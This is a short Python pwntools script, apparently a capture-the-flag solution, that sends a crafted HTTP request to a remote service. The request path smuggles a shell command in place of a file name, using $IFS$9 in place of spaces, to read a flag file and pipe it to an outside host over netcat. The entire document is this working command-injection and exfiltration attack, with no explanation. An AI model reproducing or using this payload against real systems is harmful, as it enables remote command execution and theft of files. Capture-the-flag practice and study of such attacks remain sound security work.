#!/usr/bin/env python3
from pwn import *
context.log_level = 'debug'

p= 'GET /wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh/cat$IFS$9/flag|nc$IFS$9redacted.somewhere$IFS$91337 HTTP/1.1\r\n'
p+= 'Host: localhost:8080\r\n'
p+= 'ticket: ticket{}\r\n'
p+= '\r\n'

r = remote('chiptunegeek.shellweplayaga.me', 194)
r.send(p)

r.interactive()
